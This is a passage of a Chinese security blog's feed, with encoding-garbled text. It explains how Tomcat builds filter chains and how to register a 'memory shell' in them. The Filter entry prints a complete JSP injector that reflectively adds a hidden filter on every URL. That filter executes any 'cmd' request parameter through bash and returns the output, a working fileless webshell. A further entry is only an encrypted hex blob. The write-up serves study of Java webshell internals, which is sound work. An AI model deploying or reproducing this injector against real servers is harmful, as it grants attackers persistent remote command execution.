class="line">standardContext.addApplicationEventListener(listenerDemo);</span><br></pre></td></tr></table></figure></p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><ul><li><a href="https://xz.aliyun.com/t/10358">https://xz.aliyun.com/t/10358</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;è®²è§£Listenerå†…å­˜é©¬åŸç†ï¼Œå’Œç®€å•å®ç°&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="å†…å­˜é©¬" scheme="http://example.com/categories/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
    
    <category term="ä»£ç å®¡è®¡" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="å†…å­˜é©¬" scheme="http://example.com/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>Filterå†…å­˜é©¬</title>
    <link href="http://example.com/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>http://example.com/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2022-12-04T18:24:16.000Z</published>
    <updated>2022-12-04T21:02:02.194Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¯¹Filterå†…å­˜é©¬åŸç†çš„ç®€å•åˆ†æ<br><span id="more"></span></p><h2 id="Filteræ³¨å†Œæµç¨‹"><a href="#Filteræ³¨å†Œæµç¨‹" class="headerlink" title="Filteræ³¨å†Œæµç¨‹"></a>Filteræ³¨å†Œæµç¨‹</h2><p>ç”¨ä¸€å¼ å›¾æ¥æè¿°ä¸€ä¸‹tomcatçš„åŸºæœ¬åŠ è½½æµç¨‹<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/1.jpg" alt><br>å¯ä»¥çœ‹åˆ°FilterChainæ˜¯åœ¨WrapperValueå®¹å™¨ä¸­è°ƒç”¨çš„<br>è€ŒFilterChainï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯ä¸€ä¸ªFilterçš„é“¾ï¼Œä»ç¬¬ä¸€ä¸ªFilterä¸€ç›´ä¼ åˆ°æœ€åä¸€ä¸ªFilterï¼Œç„¶åæ‰è°ƒç”¨Servlet</p><h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p>é¦–å…ˆè°ƒè¯•Filterå†…å­˜é©¬éœ€è¦å…ˆåœ¨pom.xmlåŠ <br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.67<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><br>è¿™é‡Œçš„versionæˆ‘é€‰å¾—æ˜¯å’Œæˆ‘tomcatçš„ç‰ˆæœ¬ä¸€æ ·ï¼Œä¸çŸ¥é“æœ‰æ²¡æœ‰è”ç³»<br><strong>ä¸åŠ æ¬¡ä¾èµ–æ˜¯æ— æ³•è°ƒè¯•çš„</strong></p><p>å…ˆå†™ä¸€ä¸ªç®€å•çš„Filterå®¹å™¨<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(urlPatterns = &quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterA</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;a: before&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">pw</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">        pw.write(<span class="string">&quot;aaaaaaaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        System.out.println(<span class="string">&quot;a: after&quot;</span>);</span><br><span class="line"></span><br><span class="line">        pw.write(<span class="string">&quot;&lt;br&gt;back&quot;</span>);</span><br><span class="line">        pw.flush();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>åœ¨doFilterç¬¬ä¸€è¡Œä»£ç ä¸‹æ–­ç‚¹ï¼Œæ ¹æ®è°ƒç”¨æ ˆå¯ä»¥çœ‹åˆ°WrapperValueå®¹å™¨<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/2.jpg" alt></p><p>è¿›å…¥WrapperValueï¼Œå¾€ä¸Šç¿»æ‰¾å¯ä»¥çœ‹åˆ°filterChainçš„æ¥æºï¼Œåœ¨æ­¤å¤„ä¸‹æ–­ç‚¹ï¼Œé‡æ–°è°ƒè¯•<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/3.jpg" alt></p><p>è¿›å…¥createFilterChainï¼Œæ³¨æ„åˆ°è¿™ä¸€è¡Œä»£ç ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œé¢æœ‰æˆ‘ä»¬çš„Filteré“¾ï¼Œæ˜¯ä¸€ä¸ªMapï¼Œå¦å¤–ä¸€æ¡åº”è¯¥æ˜¯tomcatè‡ªå¸¦çš„filterï¼Œè¿™è¡Œå°±æ˜¯ä»contextå¯¹è±¡ä¸­è·å–ç°æœ‰çš„Filteré“¾<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/4.jpg" alt><br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/5.jpg" alt></p><p>å¾€ä¸‹åˆ°äº†ä¸€ä¸ªå¾ªç¯å¤„ï¼Œæ˜¯æ ¹æ®ä¸Šé¢å¾—åˆ°çš„filterMapï¼Œå»ä¾æ¬¡ä»contextä¸­å–å‡ºfilterConfig<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/6.jpg" alt><br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/7.jpg" alt></p><p>è·å–åˆ°filterConfigåå°±ä¼šå°†filterConfigåŠ å…¥filterChainä¸­ï¼Œè¯¥filterChainå¯¹è±¡ä¸­çš„filtersåˆ—è¡¨ä¼šæ·»åŠ filterConfig<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/8.jpg" alt></p><p>åˆ›å»ºå®ŒFilterChainåï¼Œæ¥åˆ°filterChainçš„doFilteræ–¹æ³•<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/9.jpg" alt></p><p>è·Ÿç€è°ƒè¯•ï¼Œä¼šè¿›å…¥internalDofilteræ–¹æ³•ï¼Œnæ˜¯Filterä¸ªæ•°ï¼Œposæ˜¯å½“å‰æ˜¯ç¬¬å‡ ä¸ªFilter<br>é¦–å…ˆä¼šå–å‡ºå½“å‰çš„filterConfigï¼Œå¹¶é€šè¿‡getFilterå‡½æ•°ï¼Œä»filterConfigå–å‡ºfilterå¯¹è±¡<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/10.jpg" alt><br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/11.jpg" alt></p><p>æœ€åæ‹¿åˆ°filterå¯¹è±¡äº†ï¼Œé€šè¿‡doFilterè°ƒç”¨å…·ä½“çš„Filterï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å†™çš„é‚£ä¸ªdemo<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/12.jpg" alt><br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/13.jpg" alt></p><p>é‚£ä¹ˆè¯¥è°ƒç”¨è¿‡ç¨‹å°±åˆ†æçš„å·®ä¸å¤šäº†</p><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><ul><li>å…ˆä»contextä¸­è·å–filterMaps</li><li>æ ¹æ®filterMapsä»contextä¸­å–å‡ºfilterConfig</li><li>å°†filterConfigåŠ å…¥filterChainä¸­ï¼ŒfilterChainä¸­çš„filtersæˆå‘˜å˜é‡ä¼šæ·»åŠ filterConfig</li><li>è°ƒç”¨doFilter</li></ul><h2 id="å†…å­˜é©¬"><a href="#å†…å­˜é©¬" class="headerlink" title="å†…å­˜é©¬"></a>å†…å­˜é©¬</h2><p>é€šè¿‡ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“å¦‚æœæƒ³å°†æœ¨é©¬æ³¨å†Œåˆ°filterä¸­ï¼Œé‚£ä¹ˆå°±éœ€è¦contextå¯¹è±¡çš„ä¸¤ä¸ªå‚æ•°</p><ul><li>filterMaps</li><li>filterConfigs</li></ul><p>åœ¨ä»–ä»¬ä¸¤ä¸ªMapä¸­æ·»åŠ ç›¸åº”çš„filterå°±è¡Œäº†</p><p>ä½†æ˜¯ï¼Œå½“æˆ‘ä»¬å»çœ‹filterConfigsç›¸åº”çš„æ„é€ å‡½æ•°ä»£ç ï¼Œä¼šå‘ç°éœ€è¦ä¼ é€’ Contextå’ŒfilterDefï¼Œä¸”å¹¶ä¸å¸¦æœ‰publicï¼Œé‚£ä¹ˆå°±éœ€è¦é€šè¿‡åå°„è·å–<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/14.jpg" alt></p><p>contextå°±æ˜¯ä¸Šé¢åˆ†æçš„é‚£ä¸ªcontext<br>æ‰€ä»¥æœ€åéœ€è¦ä¸‰ä¸ªå‚æ•°ï¼Œå…·ä½“å¦‚ä½•ç”Ÿæˆå¯ä»¥çœ‹ç›¸åº”çš„æ„é€ å‡½æ•°</p><ul><li>filterMaps</li><li>filterConfigs</li><li>filterDef</li></ul><p>é‚£ä¹ˆæœ€ç»ˆçš„ä»£ç å¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;abcd&quot;</span>;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name)==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,len));</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * å°†filterDefæ·»åŠ åˆ°filterDefsä¸­</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><ul><li><a href="https://xz.aliyun.com/t/10362">https://xz.aliyun.com/t/10362</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;å¯¹Filterå†…å­˜é©¬åŸç†çš„ç®€å•åˆ†æ&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="å†…å­˜é©¬" scheme="http://example.com/categories/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
    
    <category term="ä»£ç å®¡è®¡" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="å†…å­˜é©¬" scheme="http://example.com/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>buuåˆ·é¢˜(1)</title>
    <link href="http://example.com/2022/12/04/buu%E5%88%B7%E9%A2%98-1/"/>
    <id>http://example.com/2022/12/04/buu%E5%88%B7%E9%A2%98-1/</id>
    <published>2022-12-03T22:38:24.000Z</published>
    <updated>2022-12-13T11:32:42.719Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="å¯†ç é”™è¯¯" data-whm="åŠ å¯†æ— æ³•éªŒè¯">  <script id="hbeData" type="hbeData" data-hmacdigest="941071248fd19cc97be93fda44a72c67642ab6f36c8a8389ce321e0a098a30f6">997c39fd209fc88ff14214af16a192b2c0d0a378e6a90d93e73b2a42d40bfff4e41adebf5542ca7a94e3c7327072ef795c6c08f7b554ef99503e7c2dd0025c6f777abba86e3193d7c38c33f3a424e702b0dabdc08d2dd4a2a688d3acb3e06d6c721381500e8471a4bf8c6c39e82f831de40b573075097e56dbb9b94f6bc05e62432ba59f041d89d5aa22f3f536594dbe0691723257ac713ef27acf11fed6458cc17aa55e67abd4f0396b5ff7dca378c040410e8023fa9eba9accf02d2c23ab714323b90a33254125022a9dd31ac09d88bf5c778557ff7a2b1cf9e05cfe1a1248aae9f617f08b6acd21a8b8222f7d7a7faccab0e6851427bc9de65121b4d2660cee7d409059986b2ab51fba2c97cae72e72e0901489f07ffa551b1e14e70d7102f0db999eb86dab7e48e73fceb9d9f9856f65eab8362b57e17ce73ded1ec71344e3c9e32c9749a15903cc168ef11f9ddd86da62916653c90a4cb36250c3adb3270429fda496e7690fc522eabddb9b92d63a9242125512b3ecde36ec62b7a63f90b7543043256340e8b128d39b5a3c263d7926db076ff98d2b6714c4a6fc059220f68303daee13e7736182e1d19f7f55dfecd9cdc0383c8e8857c3ad39eb5fb179353efdd4e5d6499190de947192e75253a025c57397a816b782477449eaa693b34c6f707f1de3f5964281164bcb20e416bbe2cf415b278b336847803b9ed8cb24387dfb868668b29decb14c96d1f96f35d000e11afa1d2c41905843f1245e6bbdbd9e71eef9cc2472b3ad00c49923a41d46dd0d046c15f31e54fcf16a12ceff58d7dc09451fe797e3f6e9f7eec6cd1d757d86f32a376673ecfaf44aad972e8115ba21c3c91ae2ac973c6bfcba667dc593262d87cecd9179bf307b11629564f228eb0e7e559f78b9e2e6b5fd8ea3b0657684e8875dfba46999510672d5b38510e5efca587e869337866ecd2513c1216642eccc69359d9f2fe27f08789e049b777a9f8ea9d02ba212427bf00622e8aff7451713b5103a05f0282eb397e1e4b7fd7e5b35d6dfa83b63c36f262f58a707d217c3b0fe665c170dc8d4529b67e9faa9fa73c10ea270654c4cef48534208589ed2898c3457d364658715bb902568eefb06b419545c2f161bebb865c22ca95ffa821fa1b3fad6af5e658ad9c47156fd601af58868cb8d002529347f4086cc263dac5177d06fdca78a4bc759851d82044906a308c1264c5c4c37e11af0055291a37d63c2f454504f75074cc5e50414c348cbc7eecfe16ff74c1c3d216a41cefe5396b2589512d31438671d18ee57dc70990d007b439fb8db70f1d3d5609f79d079be11487ea6d5c448e04f1a02fb23f9dcc6625a73eeecdb60f813d0be83e9f21ecd44bb3d0569e2a484dff1ad7085f02cd21bae6f9fc1301f0a9742c2e2dac0f944a79e5605a4bc75688fb9fc60c54dcb3b711b399ddfc2880443c1bbfc42fc6f439c623ffbf0f598b9caac42ee4bafb93a7553a1e3593063cbedb4665b0696bd1b429b9fdb615e263933c6add25b9ad35434cea14f0f8b929549277f8b6e87cb00535d2e7290cc53135a877e17eaebf96b7e23be856d8aea7ae76db609ccc7eb279174b8a90403a4d2a804286529f0bf93f7f561e03b8b38467eedbc1bc940d02ded058fe26f810eb702c49133b4f27ef2dd74142bbaaa4fbb57eefb6637f47dc7c32ae432f7abdd71f0208714eb5426c2429b0f70e8150732ebd613dcfe1d23e17067178edad1b798eb3549392b0c8fbf18fe3e62c0f884c1ad8ee2a9393bf117499698fe19db32944d0b997d0325ad2620eb6f394726ac8d650b93d16e8c70ec1a0f993cf552a70940ca4e275c76d0a6016a8b1d7a7632f856e70ac806f22c4e7eb79e69181eeb08cc33dd0590313f9183a566099612949ea840d1c6c33b07951b4ba61e5ec9074a0c40e62238c3b3f396e3fe2d93ea18fc9df230a0d731bcab636d0a6758e33c19487ed6529419fa982a81f2133aed3de3c6d3af6a280b55031bfc8d1f9fc7e944062a860598fbaa79ab4b102ad690fc1741d54129fe5ac3442056ef4f5972bac2c9e0aa78e75242fb499fda9512a66f75baecbe203f4baaafcdf5205a4ddcb9ec9c41a72a51d1883a4c0d03b279dfeeba210d4420c4932dccaf84a2b6131182151d7ec43b926c28986a159f8a15035e39dfee619d9f904c5cafdea8a43b368360db7edd7275abf0939b484f3b8f5daccc70d5c8b4f8818d723557eb7cc5b3fb02efe31385f496d79c440d0336f99e02217f55ec149183395f4e77a2b910875c74ffd9e781807e78db16b7f79b144018351a364096d67db1b36aaf2a4cf72ae56519e52effb0a3f64ce212e9ebfdebc513fed6f940bf4184c61c64fc67b5c54fd3fca5b896e55896879b927169190c201ac56f284e1ae740108564783efb69d25f5bf057a2c70c86266bd1b679d9efed7f83a79a0228751243dc12324c41384afd30345e95fe2dba2232ffb7beb38e9d35147504a554104bafc7cd7a314ffd64f70a80a0e0560247e33469bca6867ce79d49387d95844b141838a1c06970e1cf26ebcee76909458cb43d998b07821b8276d7174a9aed62a05dcff0fe7490018f7b56d5548f256d7c63c57871a5130fd65888d1f0c640a5984ebbaca7f15658fe73d92388d0e52e155fd65841c19823cc31d57db83382fe46519b5c73b4670778248fc01953e3ffdb61386e140a29fb8f9e353fe98ec4d90d0a3bee889ff9caffefdeb8c93458abd6ce00be24ee507677b0b508492ae4b098f7c25f2eaf07e1853fa5e8506893e60c53d08f31b114c1dcdb1debca0c8f10f8e57249ba7edec0355f6718f1d5f880d51cf7888edbb77658642b611dbda6b3546de66ef6b29b5af94e0ada7bba8a97e34ad846f580a2c0b5a4d082242e16447100ab56a38482388ce882a737ad862c0c8b701eefe5ba5e24d52806aa8698cdd61678a90d4a2c3f43135436aa3c5ec64a47882e27ef97dea0e9598ce1587ea1b70664978f50f9f7ade61c8172d598dc8ad19834cb478c0c88fcd5534303a828131f26d44d812dc326b469167eb5ec4d860eed6736935d3c06efae3d7725b3c4fa39385fe2f273adf3afa7101c25e0858fb335f40e84749dec92c0b9b04fd26c8b7e5f98352aae7701931399e2b4bcf3af5347167e20cf91711c4240e352bc93d592cc5b1667cf421f8d0ec6b1481dd8382da15376afab4c0fdbcda51e681e91e967f079635368c478bd972b0f9b05c39731728c15ab982e4df754477f12830a84bb40626d4ab904395dc4f6f4fe2799c6af7d43a20927970a8ca87029dd82f1a8e0140ec47c4416bc3e5c311db0cbec39b98352559c64aa02678a452c28034f63821bc699152a02a343df47f37b52a1d1d39f9cb4e601a8fab04ad1729a